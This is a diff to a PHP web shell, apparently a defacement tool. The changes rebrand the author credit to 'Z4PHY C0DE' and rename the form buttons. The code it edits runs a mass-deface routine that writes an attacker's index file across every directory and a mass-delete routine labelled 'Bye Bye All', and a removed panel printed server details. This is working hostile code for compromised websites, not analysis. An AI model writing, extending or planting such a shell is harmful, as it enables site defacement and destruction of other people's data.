@@ -128,11 +128,7 @@ text-align: left;
 <table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
 <tr><td>';
 echo "<tr><td><font color='white'>
-+ IP Kamu Syg    <td>: <font color='LightBlue'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
-+ IP Server  <td>: <font color='LightBlue'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
-+ system     <td>: <font color='LightBlue'>".php_uname()."<tr><td><font color='white'>
-+ Coded By   <td>: <font color='LightBlue'>Zildan-Sec<tr><td><font color='white'>
-+ Website<td>: <font color='LightBlue'>Zildan-Sec.my.id<tr><td><font color='white'>
++ Coded By   <td>: <font color='LightBlue'>Z4PHY C0DE<tr><td><font color='white'>
 </table>";
 echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
 <center><tr align="center"><td align="center">path : ';
@@ -226,7 +222,7 @@ if($_GET['to'] == 'z4phy') {
 			}
 		}
 	}
-	if($_POST['start']) {
+	if($_POST['mulaiz4p']) {
 		if($_POST['tipe_sabun'] == 'mahal') {
 			echo "<div style='margin: 5px auto; padding: 5px'>";
 			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
@@ -247,7 +243,7 @@ if($_GET['to'] == 'z4phy') {
 	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
 	<font style='text-decoration: underline;'>Index File:</font><br>
 	<textarea name='script' style='width: 450px; height: 200px;'>$ .: SWEET TOUCH BY Z4PHY :. $</textarea><br>
-	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
+	<input type='submit' name='mulaiz4p' value='Nyalakan' style='width: 450px;'>
 	</form></center>";
 	} 
 	} elseif($_GET['to'] == 'z4p') {
@@ -279,7 +275,7 @@ if(is_writable($dir)) {
    }
 }
    }
-   if($_POST['start']) {
+   if($_POST['mulaiz4p']) {
 echo "<div style='margin: 5px auto; padding: 5px'>";
 hapus_massal($_POST['d_dir'], $_POST['d_file']);
 echo "</div>";
@@ -289,8 +285,8 @@ echo "</div>";
    <font>Folder :</font><br>
    <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
    <font>Filename :</font><br>
-   <input type='text' name='d_file' value='nyawa lu aja mass delete gan:v' style='width: 450px;' height='10'><br>
-   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
+   <input type='text' name='d_file' value='nyawa lu aja Bye Bye All gan:v' style='width: 450px;' height='10'><br>
+   <input type='submit' name='mulaiz4p' value='Bye Bye All' style='width: 450px;'>
    </form></center>";
    }
    //BATAS
